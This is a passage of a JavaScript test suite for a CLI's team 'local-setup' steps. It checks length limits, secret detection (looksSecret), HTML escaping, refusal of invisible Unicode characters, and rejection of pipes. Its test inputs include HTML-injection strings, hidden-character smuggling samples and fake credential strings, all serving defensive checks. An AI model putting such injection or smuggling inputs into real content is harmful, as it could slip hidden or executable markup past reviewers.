  assert.equal(row.id, 'local-setup');
  assert.equal(row.status, 'warn');
  assert.match(row.message, /docker/);
  assert.match(row.message, /tool-nowhere/);
  quiet(() => runLocalSetupSkip(dir, { ids: ['docker'], reason: 'no' }));
  quiet(() => runLocalSetupSkip(dir, { ids: ['tool-nowhere'], reason: 'no' }));
  assert.ok(!rows(dir).some((r) => r.id === 'local-setup' && /docker|tool-nowhere/.test(r.message)));
  put(localSetupRecordPath(dir), '{');
  row = rows(dir).find((r) => r.id === 'local-setup-record');
  assert.equal(row.status, 'warn');
  assert.match(row.message, /does not parse/);
});

test('through the CLI: done and skip answer in --json, refuse words and flags that do not belong, and the section says what changed', () => {
  const T = tmp();
  const dir = committedProduct();
  let r = yad(T, dir, ['local-setup', 'done', 'docker', '--json']);
  assert.equal(r.code, 0, r.err);
  assert.deepEqual(r.json.done, ['docker']);
  r = yad(T, dir, ['local-setup', 'done', 'docker', 'tool-nowhere', '--json']);
  assert.equal(r.code, 1);
  assert.equal(r.json.ok, false);
  assert.deepEqual(r.json.failing.map((f) => f.id), ['tool-nowhere']);
  r = yad(T, dir, ['local-setup', 'skip', 'tool-nowhere', '--reason', 'not here', '--json']);
  assert.equal(r.code, 0, r.err);
  assert.equal(r.json.skipped, 'tool-nowhere');
  assert.equal(r.json.required, false);
  const list = yad(T, dir, ['local-setup', '--json']).json;
  assert.equal(list.skipped, 1);
  assert.deepEqual(list.steps.find((x) => x.id === 'tool-nowhere').reason, 'not here');
  // Words and flags that do not belong.
  assert.equal(yad(T, dir, ['local-setup', 'done', 'docker', '--reason', 'x']).code, 1);
  assert.equal(yad(T, dir, ['local-setup', 'list', '--reason', 'x']).code, 1);
  assert.equal(yad(T, dir, ['local-setup', 'list', 'docker']).code, 1);
  assert.equal(yad(T, dir, ['local-setup', 'skip', 'docker', 'tool-nowhere', '--reason', 'x']).code, 1);
  assert.equal(yad(T, dir, ['local-setup', 'done']).code, 1);

  // The team changes what docker runs: the section names it as changed.
  const file = path.join(dir, LOCAL_SETUP_FILE);
  put(file, { ...JSON.parse(read(file)), team: [teamStep({ commands: ['brew install --cask docker@4'] })] });
  execFileSync('git', ['-c', 'user.name=Dev', '-c', 'user.email=dev@example.com', '-c', 'commit.gpgsign=false', 'commit', '-qam', 'docker 4', '--no-verify'], { cwd: dir });
  const { lines, value } = quiet(() => localSetupSection(dir));
  assert.deepEqual(value.changed, ['docker']);
  assert.ok(lines.some((l) => /changed since this machine last answered: docker/.test(l)), lines.join('\n'));
  assert.ok(lines.some((l) => /said no to: tool-nowhere/.test(l)));
});

// ---- E185 part 3 --------------------------------------------------------------------------------

test('E185 part 3: a step stays readable — length caps, plain prose, person and addedBy kinds', async () => {
  const { stepProblems, STEP_LIMITS } = await import('./local-setup.mjs');
  assert.deepEqual(stepProblems(teamStep(), 'team'), []);
  assert.deepEqual(stepProblems(teamStep({ purpose: 'two lines\nof purpose', person: true, addedBy: null }), 'team'), [], 'prose may wrap');
  const bad = (extra, re) => assert.ok(stepProblems(teamStep(extra), 'team').some((p) => re.test(p)), JSON.stringify(extra).slice(0, 80));
  bad({ title: 'x'.repeat(STEP_LIMITS.title + 1) }, /title should be one plain line/);
  bad({ title: 'a\nb' }, /title should be one plain line/);
  bad({ purpose: 'x'.repeat(STEP_LIMITS.text + 1) }, /purpose should be plain text/);
  bad({ impact: 'looks​plain' }, /impact should be plain text/);
  bad({ impact: 'bell\u0007' }, /impact should be plain text/);
  bad({ commands: Array.from({ length: STEP_LIMITS.commands + 1 }, () => 'true') }, /at most 10 commands/);
  bad({ commands: ['x'.repeat(STEP_LIMITS.command + 1)] }, /at most 10 commands of at most 500/);
  bad({ verify: 'x'.repeat(STEP_LIMITS.command + 1) }, /verify should be one line/);
  bad({ check: { run: 'x'.repeat(STEP_LIMITS.command + 1) } }, /check should be/);
  bad({ person: 'yes' }, /`person` should be true or false/);
  bad({ addedBy: 7 }, /`addedBy` should be a name/);
});

test('E185 part 3: looksSecret finds a token or a literal key, never a name for where it comes from', async () => {
  const { looksSecret } = await import('./secret-text.mjs');
  for (const s of ['ghp_abcdefghij1234', 'export API_KEY=abcd1234efgh', 'password: "hunter22hunter"', 'curl -H "x" sk-abcdefghijklmnop1234', '-----BEGIN RSA PRIVATE KEY-----']) assert.equal(looksSecret(s), true, s);
  for (const s of ['export API_KEY=$API_KEY', 'token: <your token>', 'password={{ vault }}', 'SECRET=${SECRET}', 'npm i -g pnpm', 'git config commit.gpgsign true', 'see the api key docs']) assert.equal(looksSecret(s), false, s);
  // Review 1: more secrets found, and names for where a value is no longer taken for one.
  for (const s of ['docker login -p hunter2hunter', 'docker login --password hunter2hunter', 'mysql -uroot -phunter2x', 'curl https://user:hunter2x@host', 'postgres://app:secretpw1@localhost/db', 'sk_live_abcdefghijkl12', 'aws configure set aws_secret_access_key abcd1234efgh5678']) assert.equal(looksSecret(s), true, s);
  for (const s of ['kubectl create secret generic app --from-literal=password=supersecret1', 'curl "https://api.example.com/x?user=me&api_key=1234567890abcdef"', 'curl -d foo=bar&token=abcdefgh12345 https://x', 'echo url=https://h/?token=SECRETSECRET123']) assert.equal(looksSecret(s), true, s);
  // Review 3: flags written --name=value, and passwords holding & or =.
  for (const s of ['mytool --api-key=abcdefgh12345', 'mytool --client-secret=abcdefgh12345', 'aws --secret-access-key=abcdefgh12345', 'export DB_PASSWORD=p@ss&w0rd!xyz', 'export DB_PASSWORD=ab=cdefghijklmn', 'export PASSWORD="p&ssword123"']) assert.equal(looksSecret(s), true, s);
  // Review 4: a quoted value is read whole; an empty value before the next name is not one.
  for (const s of ['export TOKEN="abc,defghijk"', 'export API_KEY=\'abcd;efghijkl\'', 'export DB_PASSWORD="p@ss,word123"']) assert.equal(looksSecret(s), true, s);
  for (const s of ['token.ttl=36000000', 'cp tokens.json:12345678 x', 'curl "https://x/login?password=&user=administrator"', 'export API_KEY="$API_KEY"', 'export PASSWORD="${PASSWORD}"']) assert.equal(looksSecret(s), false, s);
  for (const s of ['gh auth login && mkdir -p ~/.config/foo', 'aws sso login --profile dev && mkdir -p .aws/cache', 'az login; cp -p src/file dest/file']) assert.equal(looksSecret(s), false, s);
  for (const s of ['export TOKEN_URL=https://auth.example.com/token', 'export PASSWORD_FILE=/etc/secrets/pw', 'export SECRET_NAME=prod-db-creds', 'export API_KEY_HEADER=X-Api-Key', 'docker run -p 8080:80 app', 'mkdir -p build/out', 'postgres://app:$PGPASS@localhost/db', 'git config --global user.signingkey ABCDEF1234567890', 'npm config set //registry.npmjs.org/:_authToken=${NPM_TOKEN}']) assert.equal(looksSecret(s), false, s);
  const { redactTokens } = await import('./scan.mjs');
  assert.equal(redactTokens('a ghp_abcdefghij1234 b'), 'a [redacted] b', 'yad scan still redacts the same way');
});

// A step file the way an agent writes it, outside the repo.
const stepFile = (T, step) => { const f = path.join(T, `step-${Math.random().toString(36).slice(2)}.json`); put(f, step); return f; };
const newStep = (extra = {}) => ({ id: 'env-file', title: 'Make your .env', purpose: 'the API reads its settings from .env', impact: 'adds a .env file you keep to yourself', when: 'required', commands: ['cp .env.example .env'], check: { run: 'test -f .env' }, ...extra });
const gitIn = (dir, ...a) => execFileSync('git', a, { cwd: dir, env: { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1' }, encoding: 'utf8' });

test('E185 part 3: add writes the team step into the script and the view, by yad\'s own rules; remove takes it out', async () => {
  const { runLocalSetupAdd, runLocalSetupRemove } = await import('./local-setup.mjs');
  const dir = committedProduct(undefined, []);
  gitIn(dir, 'config', 'user.name', 'Rana Ali');
  const T = tmp();
  const r = quiet(() => runLocalSetupAdd(dir, { from: stepFile(T, newStep({ person: false })) }));
  assert.equal(r.value.added, 'env-file', r.lines.join('\n'));
  const doc = JSON.parse(read(path.join(dir, LOCAL_SETUP_FILE)));
  const written = doc.team.find((s) => s.id === 'env-file');
  assert.equal(written.addedBy, 'Rana Ali', 'the git name, never the file\'s');
  assert.equal(written.source, undefined);
  assert.equal(written.vetted, undefined);
  assert.ok(doc.yadflow.length > 0, 'yadflow\'s steps kept');
  assert.match(read(path.join(dir, LOCAL_SETUP_DOC)), /Make your \.env/);
  assert.ok(r.lines.some((l) => /commit both/.test(l)));
  gitIn(dir, 'add', '-A');
  gitIn(dir, '-c', 'user.email=r@example.com', '-c', 'commit.gpgsign=false', 'commit', '-qm', 'team step', '--no-verify');
  const st = stateOf(dir, 'env-file', { noProgram: true });
  assert.equal(st.state, 'ask');
  assert.equal(st.source, 'team');
  assert.equal(st.vetted, false);
  const gone = quiet(() => runLocalSetupRemove(dir, { ids: ['env-file'] }));
  assert.equal(gone.value.removed, 'env-file', gone.lines.join('\n'));
  assert.ok(!JSON.parse(read(path.join(dir, LOCAL_SETUP_FILE))).team.some((s) => s.id === 'env-file'));
  assert.doesNotMatch(read(path.join(dir, LOCAL_SETUP_DOC)), /Make your \.env/);
});

test('E185 part 3: add refuses an id taken, keys yad sets, a bad step, a secret, a broken script — and writes nothing', async () => {
  const { runLocalSetupAdd } = await import('./local-setup.mjs');
  const dir = committedProduct();
  const T = tmp();
  const file = path.join(dir, LOCAL_SETUP_FILE);
  const before = read(file);
  const refused = (step, re) => {
    const r = quiet(() => runLocalSetupAdd(dir, { from: typeof step === 'string' ? step : stepFile(T, step) }));
    assert.equal(r.code, 1, r.lines.join('\n'));
    assert.ok(r.lines.some((l) => re.test(l)), `${re}: ${r.lines.join(' | ')}`);
    assert.equal(read(file), before, 'nothing written');
  };
  refused(newStep({ id: 'docker' }), /already one of your team's steps/);
  refused(newStep({ id: 'yadflow-cli' }), /kept for yadflow's own steps/);
  refused(newStep({ id: 'platform-login' }), /kept for yadflow's own steps/);
  refused(newStep({ id: 'tool-docker' }), /kept for yadflow's own steps/);
  refused(newStep({ vetted: true }), /`vetted`, which a step does not take/);
  refused(newStep({ addedBy: 'Someone' }), /`addedBy`, which a step does not take/);
  refused(newStep({ commands: [] }), /cannot be added: it has no commands/);
  refused(newStep({ title: 'x <!-- y' }), /cannot be added/);
  refused(newStep({ commands: ['export API_KEY=abcd1234efgh'] }), /command 1 looks like it holds a secret/);
  refused(newStep({ purpose: 'uses ghp_abcdefghij1234' }), /purpose looks like it holds a secret/);
  refused(path.join(T, 'missing.json'), /cannot read/);
  put(path.join(T, 'bad.json'), '{ nope');
  refused(path.join(T, 'bad.json'), /does not parse as JSON/);
  put(path.join(T, 'list.json'), '[]');
  refused(path.join(T, 'list.json'), /should hold one step/);
  assert.equal(quiet(() => runLocalSetupAdd(dir, { from: stepFile(T, newStep({ commands: ['export API_KEY=$API_KEY'] })) })).value.added, 'env-file', 'a name for where it comes from is fine');
  // A script that does not parse is never replaced.
  put(file, '{ broken');
  const r = quiet(() => runLocalSetupAdd(dir, { from: stepFile(T, newStep({ id: 'other' })) }));
  assert.equal(r.code, 1);
  assert.ok(r.lines.some((l) => /does not parse, so it was not changed/.test(l)), r.lines.join(' | '));
  assert.equal(read(file), '{ broken');
});

test('E185 part 3: remove refuses yadflow\'s steps and ids that are not there', async () => {
  const { runLocalSetupRemove } = await import('./local-setup.mjs');
  const dir = committedProduct();
  const r1 = quiet(() => runLocalSetupRemove(dir, { ids: ['yadflow-cli'] }));
  assert.equal(r1.code, 1);
  assert.ok(r1.lines.some((l) => /one of yadflow's steps.*skip yadflow-cli/.test(l)), r1.lines.join(' | '));
  const r2 = quiet(() => runLocalSetupRemove(dir, { ids: ['nope'] }));
  assert.ok(r2.lines.some((l) => /no team step `nope`/.test(l)));
  assert.equal(quiet(() => runLocalSetupRemove(dir, { ids: [] })).code, 1);
});

test('E185 part 3: add and remove from the CLI, in JSON; on-request for an agent; refused outside a Product', async () => {
  const { classify } = await import('./agent-rules.mjs');
  assert.equal(classify(['local-setup', 'add']), 'on-request');
  assert.equal(classify(['local-setup', 'remove']), 'on-request');
  const dir = committedProduct();
  const T = tmp();
  const add = yad(T, dir, ['local-setup', 'add', '--from', stepFile(T, newStep()), '--json']);
  assert.equal(add.code, 0, add.err + add.out);
  assert.equal(add.json.command, 'local-setup add');
  assert.equal(add.json.added, 'env-file');
  const rm = yad(T, dir, ['local-setup', 'remove', 'env-file', '--json']);
  assert.equal(rm.code, 0, rm.err + rm.out);
  assert.equal(rm.json.removed, 'env-file');
  assert.notEqual(yad(T, dir, ['local-setup', 'add', 'words']).code, 0);
  assert.notEqual(yad(T, dir, ['local-setup', 'list', '--from', 'x.json']).code, 0);
  const plain = tmp();
  assert.notEqual(yad(T, plain, ['local-setup', 'add', '--from', stepFile(T, newStep())]).code, 0);
  assert.equal(fs.existsSync(path.join(plain, LOCAL_SETUP_FILE)), false);
});

test('E185 part 3: the machine section says when the team has no steps of its own yet, and stops once it has', () => {
  const none = committedProduct(undefined, []);
  const a = quiet(() => localSetupSection(none, { invite: true }));
  assert.ok(!quiet(() => localSetupSection(none)).lines.some((l) => /no steps from your team yet/.test(l)), 'only on setup and update');
  assert.ok(a.lines.some((l) => /no steps from your team yet — add this project's own with `yad local-setup add/.test(l)), a.lines.join('\n'));
  const some = committedProduct();
  const b = quiet(() => localSetupSection(some, { invite: true }));
  assert.ok(!b.lines.some((l) => /no steps from your team yet/.test(l)), b.lines.join('\n'));
});

// ---- E185 part 3, review 1 -------------------------------------------------------------------------

test('E185 part 3 review 1: nothing hidden passes — variation selectors, blank fillers, half a character pair', async () => {
  const { stepProblems } = await import('./local-setup.mjs');
  for (const ch of ['\u{FE0F}', '\u{E0100}', '\u{E0141}', '\u3164', '\u115F', '\uFFA0', '\u2800', '\ud800']) {
    assert.ok(stepProblems(teamStep({ purpose: `hi${ch}there` }), 'team').length, `purpose with U+${ch.codePointAt(0).toString(16)}`);
    assert.ok(stepProblems(teamStep({ commands: [`echo a${ch}b`] }), 'team').length, `command with U+${ch.codePointAt(0).toString(16)}`);
  }
});

test('E185 part 3 review 1: the view writes a step\'s HTML as text', () => {
  const lines = localSetupDocLines({ yadflow: [], team: [teamStep({ title: '<details open><summary>ok</summary>', purpose: 'see <img src=x> & more' })] }).join('\n');
  assert.ok(!lines.includes('<details'), lines);
  assert.match(lines, /&lt;details open&gt;/);
  assert.match(lines, /see &lt;img src=x&gt; &amp; more/);
});

test('E185 part 3 review 1: add writes only the team list, refuses when the view cannot follow, and when there is no script yet', async () => {
  const { runLocalSetupAdd } = await import('./local-setup.mjs');
  const dir = committedProduct(undefined, []);
  const T = tmp();
  const file = path.join(dir, LOCAL_SETUP_FILE);
  // yadflow's part on disk is left exactly as it is (another yad must not rewrite it in a team's commit).
  const doc = JSON.parse(read(file));
  put(file, { ...doc, catalogueVersion: 999, yadflow: doc.yadflow.slice(0, 1) });
  assert.equal(quiet(() => runLocalSetupAdd(dir, { from: stepFile(T, newStep()) })).value.added, 'env-file');
  const after = JSON.parse(read(file));
  assert.equal(after.catalogueVersion, 999);
  assert.equal(after.yadflow.length, 1);
  // A view whose markers yad cannot trust refuses the change: the JSON and the view never disagree.
  const view = path.join(dir, LOCAL_SETUP_DOC);
  put(view, `${read(view).replace(/<!-- yadflow:local-setup:end[^\n]*-->/, '')}`);
  const before = read(file);
  const r = quiet(() => runLocalSetupAdd(dir, { from: stepFile(T, newStep({ id: 'second' })) }));
  assert.equal(r.code, 1, r.lines.join('\n'));
  assert.ok(r.lines.some((l) => /nothing was written: LOCAL-SETUP\.md cannot be updated/.test(l)), r.lines.join(' | '));
  assert.equal(read(file), before);
  // No script yet: setup and update write it, add never makes one up.
  fs.rmSync(file);
  const n = quiet(() => runLocalSetupAdd(dir, { from: stepFile(T, newStep({ id: 'third' })) }));
  assert.ok(n.lines.some((l) => /is not here yet — `yad check --fix`/.test(l)), n.lines.join(' | '));
  assert.equal(fs.existsSync(file), false);
});

test('E185 part 3 review 1: a committed team step that breaks a rule is said, and the invite is not shown; add says why the id is taken', async () => {
  const { runLocalSetupAdd } = await import('./local-setup.mjs');
  const dir = committedProduct(undefined, [teamStep({ id: 'env-file', commands: Array.from({ length: 11 }, () => 'true') })]);
  const s = quiet(() => localSetupSection(dir, { invite: true }));
  assert.ok(s.lines.some((l) => /1 part\(s\) of \.sdlc\/local-setup\.json are left out because they break a rule/.test(l)), s.lines.join('\n'));
  assert.ok(!s.lines.some((l) => /no steps from your team yet/.test(l)));
  const r = quiet(() => runLocalSetupAdd(dir, { from: stepFile(tmp(), newStep()) }));
  assert.ok(r.lines.some((l) => /already one of your team's steps \(one yad ignores now/.test(l)), r.lines.join(' | '));
});

test('E185 part 3 review 1: --from is read from where yad runs, and only as a file', async () => {
  const dir = committedProduct();
  const T = tmp();
  put(path.join(T, 'steps', 'env.json'), newStep());
  const r = yad(T, T, ['local-setup', 'add', '--from', 'steps/env.json', '--dir', dir, '--json']);
  assert.equal(r.code, 0, r.err + r.out);
  assert.equal(r.json.added, 'env-file');
  const { runLocalSetupAdd } = await import('./local-setup.mjs');
  const d = quiet(() => runLocalSetupAdd(dir, { from: T }));
  assert.ok(d.lines.some((l) => /cannot read .* as a file/.test(l)), d.lines.join(' | '));
});

test('E185 part 3 review 2: a toolbox tool takes the step limits when it is entered; a file written before still reads', async () => {
  const { customProblems, enteredToolProblems } = await import('./toolbox.mjs');
  const tool = { id: 'mytool', role: 'does a thing', fallback: 'nothing', detect: { bins: ['mytool'] } };
  assert.deepEqual(enteredToolProblems(tool), []);
  assert.ok(enteredToolProblems({ ...tool, role: 'x'.repeat(401) }).some((p) => /role is one plain line/.test(p)));
  assert.ok(enteredToolProblems({ ...tool, fallback: 'a\tb' }).some((p) => /fallback is one plain line/.test(p)));
  assert.ok(enteredToolProblems({ ...tool, install: [{ type: 'script', command: 'x'.repeat(501) }] }).some((p) => /install holds at most/.test(p)));
  // Custom tools shipped in 4.2.0: one already in a team's file keeps counting, whatever its length.
  assert.deepEqual(customProblems({ ...tool, role: `${'x'.repeat(500)}\nmore`, install: [{ type: 'script', command: 'x'.repeat(900) }] }), []);
});

// ---- E185 part 3, review 2 -------------------------------------------------------------------------

test('E185 part 3 review 2: looksSecret reads long text in time that grows with its length', { timeout: 10000 }, async () => {
  const { looksSecret } = await import('./secret-text.mjs');
  const t = Date.now();
  for (const s of ['a'.repeat(160000), 'a=b'.repeat(50000), 'a:/'.repeat(50000), 'x://y'.repeat(30000), ' login -p'.repeat(20000)]) looksSecret(s);
  assert.ok(Date.now() - t < 3000, `${Date.now() - t} ms`);
  assert.equal(looksSecret(`${'x'.repeat(3000)} export API_KEY=abcd1234efgh`), true, 'a secret far into a long line is still found');
});

test('E185 part 3 review 2: the invite is update\'s, not check --fix\'s; a team list that is not a list is said; code spans keep their text', async () => {
  const { reconcile } = await import('./reconcile.mjs');
  const dir = committedProduct(undefined, []);
  const fix = quiet(() => reconcile(dir, { fix: true }));
  await fix.value;
  assert.ok(!fix.lines.some((l) => /no steps from your team yet/.test(l)), 'check --fix');
  const up = quiet(() => reconcile(dir, { fix: true, scope: 'changed', invite: true }));
  await up.value;
  assert.ok(up.lines.some((l) => /no steps from your team yet/.test(l)), up.lines.join('\n'));
  const odd = committedProduct(undefined, { not: 'a list' });
  const s = quiet(() => localSetupSection(odd, { invite: true }));
  assert.ok(s.lines.some((l) => /left out because they break a rule/.test(l)), s.lines.join('\n'));
  assert.ok(!s.lines.some((l) => /no steps from your team yet/.test(l)));
  // Review 3: code spans are escaped too — telling them apart is what let HTML through.
  for (const purpose of ['a `<details>`` b', 'a \\`<details>` b', 'a ```<b>`` c', 'run `make <target>` & see <b>']) {
    const view = localSetupDocLines({ yadflow: [], team: [teamStep({ purpose })] }).join('\n');
    assert.ok(!/<(?:details|b|target)>/.test(view), view);
  }
});

test('E185 part 3 review 2: an invisible character Unicode only marks as ignorable is refused too', async () => {
  const { stepProblems } = await import('./local-setup.mjs');
  for (const ch of ['\u034F', '\u17B4', '\u17B5']) assert.ok(stepProblems(teamStep({ commands: [`echo a${ch}b`] }), 'team').length, `U+${ch.codePointAt(0).toString(16)}`);
});

test('E185 part 3 review 2: a pipe given as --from is refused, never read', { skip: process.platform === 'win32' }, async () => {
  const { runLocalSetupAdd } = await import('./local-setup.mjs');
  const dir = committedProduct();
  const fifo = path.join(tmp(), 'step.pipe');
  execFileSync('mkfifo', [fifo]);
  const r = quiet(() => runLocalSetupAdd(dir, { from: fifo }));
  assert.equal(r.code, 1);
  assert.ok(r.lines.some((l) => /cannot read .* as a file/.test(l)), r.lines.join(' | '));
});

test('E185 part 3 review 3: a tool already in toolbox.json whose words break a step limit keeps counting; only its step is left out', () => {
  const dir = committedProduct(undefined, []);
  const tool = { ...MISSING_TOOL, id: 'longtool', role: `does ${'a lot '.repeat(120)}`.trim() };
  put(path.join(dir, '.sdlc/toolbox.json'), { custom: [MISSING_TOOL, tool] });
  const T = tmp();
  const list = yad(T, dir, ['toolbox', 'list', '--json']);
  assert.equal(list.code, 0, list.err + list.out);
  const listed = JSON.stringify(list.json);
  assert.match(listed, /"id":"longtool"/, 'the tool is listed by its id');
  const r = quiet(() => localSetupActions(dir));
  assert.ok(r.lines.some((l) => /tool-longtool/.test(l) && /left out/.test(l)), r.lines.join('\n'));
  assert.ok(yadflowSteps(dir).some((x) => x.id === 'tool-longtool'), 'its step is built from the tool');
  const view = localSetupDocLines(mergeLocalSetup({}, dir).settings).join('\n');
  assert.ok(view.includes('tool-nowhere'), 'the other tool\'s step stays');
  assert.ok(!view.includes('tool-longtool'), 'only the step that breaks a limit is left out of the view');
});
